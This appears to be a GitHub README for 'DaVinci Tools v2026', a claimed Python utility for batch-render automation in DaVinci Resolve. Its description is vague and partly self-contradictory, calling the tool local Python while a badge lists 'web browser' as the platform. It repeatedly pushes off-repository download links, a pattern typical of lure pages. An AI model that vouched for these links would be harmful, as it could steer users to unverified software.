# DaVinci Tools v2026 - DaVinci Resolve scripting utility 2026

> **Python-based automation for DaVinci Resolve, designed to prepare batch renders, organize render queue jobs, and collect clip metadata from timelines in the current 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/felixgreenkmgs974/davinci-script-tools?style=flat-square)](https://github.com/felixgreenkmgs974/davinci-script-tools)

---

<p align="center">
  <a href="https://felixgreenkmgs974.github.io/davinci-script-tools/">
    <img src="https://img.shields.io/badge/Download-DaVinci%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download DaVinci Tools">
  </a>
</p>

> **[Download DaVinci Tools v2026](https://felixgreenkmgs974.github.io/davinci-script-tools/)**

---

[Download Latest Build](https://felixgreenkmgs974.github.io/davinci-script-tools/)

---

## What DaVinci Tools Does

DaVinci Tools is a local Python utility that automates timeline-based tasks in DaVinci Resolve. It reads timeline structure and clip labels, then turns that information into scripts and render queue entries for batch processing.

The workflow is suited to talking-head productions, recurring segments, and other projects where render names and destination folders need to remain consistent. Names can be taken from title or text overlay clips and combined with timeline ranges, reducing the amount of repeated render setup editors must perform manually.

---

## Capabilities

- Creates Python scripts that automate batch rendering in DaVinci Resolve
- Establishes render ranges from timeline tracks
- Reads names from title and text overlay clips
- Places generated render jobs in the DaVinci Resolve render queue
- Supports custom prefixes for output filenames
- Provides controls for track choice, clip-color filtering, and output destinations
- Adds sequence numbers when multiple clips use the same name
- Functions as a local tool for repeatable workflows based on timeline data

---

## Getting Started

1. Download or clone the repository into your working directory.
2. Open the project directory in the browser-based environment or in your local setup.
3. Load the provided files and connect them with your DaVinci Resolve workflow where appropriate.

For a local installation, you can use a directory such as `davinci-tools`. Keep the generated scripts near the assets associated with your Resolve project.

---

## Workflow

A standard run looks like this:

1. Open the target timeline in DaVinci Resolve.
2. Select the track or clip source that should supply render names.
3. Configure the output prefix, destination, and any track or color filters.
4. Create the Python automation script.
5. Execute the script to add the batch render jobs to the render queue.

The tool can be used to:

- Build segment names from title or text overlay clips
- Set render ranges using chosen timeline tracks
- Produce an individual job for each clip or section
- Save or export output to the configured destination path

---

## Settings

Project scripts or the local configuration layer are expected to hold the workflow settings. Typical options include:

- Output filename prefix
- Selected track
- Clip color filters
- Destination directory
- Rules for sequence numbering

Example structure:

    {
      "prefix": "Episode_",
      "track": 2,
      "clip_color": "Blue",
      "output_path": "./renders",
      "sequence_numbers": true
    }

Change these settings to reflect how your DaVinci Resolve timelines, markers, and render files are organized.

---

## Requirements

- An installed copy of DaVinci Resolve
- Python automation support in the selected workflow
- Permission to access timeline clips and render queue functions
- A browser environment for the hosted download page
- Sufficient local storage for generated scripts and rendered files

---

## Frequently Asked Questions

**How can I obtain updates?**  
Open the latest build link above and revisit the repository for updated files or script revisions.

**Is the naming workflow configurable?**  
Yes. You can adjust prefixes, tracks, clip colors, and output destinations.

**How are duplicate clip names handled?**  
Sequence numbering can be enabled to separate outputs that originate from repeated names.

**Where does the tool place render jobs?**  
After the generated automation script is run, the jobs are prepared in DaVinci Resolve's render queue.

**What should I check when the generated script does not fit the timeline?**  
Verify the selected track, the clip types being read, and the active filtering options, then generate the batch render script again.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
